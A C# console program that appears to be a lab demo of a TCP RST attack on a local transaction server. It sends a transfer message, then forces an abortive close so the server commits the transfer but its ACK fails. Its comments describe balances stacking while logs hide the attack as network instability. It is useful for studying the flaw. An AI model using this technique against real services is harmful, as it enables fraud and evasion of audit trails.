using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ClientSender
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Thread.Sleep(2000); // wait for server to load

            // Uncomment one at a time:
            AttackerMetRst();   // RST exploit
           //ClientMetFin();   // legitimate FIN close

        }

        static void AttackerMetRst()
        {
            try
            {
                var attacker = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                attacker.Connect("127.0.0.1", 9001);
                Console.WriteLine("[CLIENT] Connected");

                attacker.Send(Encoding.UTF8.GetBytes("TRANSFER:amount=1000:to=attacker"));
                Console.WriteLine("[CLIENT] Payload sent");



                // Linger=true, timeout=0 → RST on Close()
                attacker.SetSocketOption(
                    SocketOptionLevel.Socket,
                    SocketOptionName.Linger,
                    new LingerOption(true, 0)
                );
                Thread.Sleep(2000);
                attacker.Close();
                Console.WriteLine("[ATTACKER] RST sent — server ACK will fail");
            }
            catch (Exception e)
            {
                Console.WriteLine("[ATTACKER ERROR] " + e.Message);
            }
        }

        static void ClientMetFin()
        {
            try
            {
                var client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                client.Connect("127.0.0.1", 9001);
                Console.WriteLine("[CLIENT] Connected");

                client.Send(Encoding.UTF8.GetBytes("TRANSFER:amount=1000:to=attacker"));
                Console.WriteLine("[CLIENT] Payload sent");

                var buf = new byte[1024];
                int n = client.Receive(buf);
                Console.WriteLine("[CLIENT] " + Encoding.UTF8.GetString(buf, 0, n));

                client.Close();
                Console.WriteLine("[CLIENT] FIN sent — clean close");
            }
            catch (Exception e)
            {
                Console.WriteLine("[CLIENT ERROR] " + e.Message);
            }
        }
    }
}

//**What to observe:**
//```
//AttackerMet() → server logs COMMIT + ERROR → balance changes → no ACK received
//ClientMet()   → server logs COMMIT + ACK sent → balance changes → client receives ACK

//Run AttackerMet() three times:
//→ balance stacks: $2000 → $3000 → $4000
//→ server logs three errors
//→ attacker received zero ACKs
//→ logs show network instability — not attacks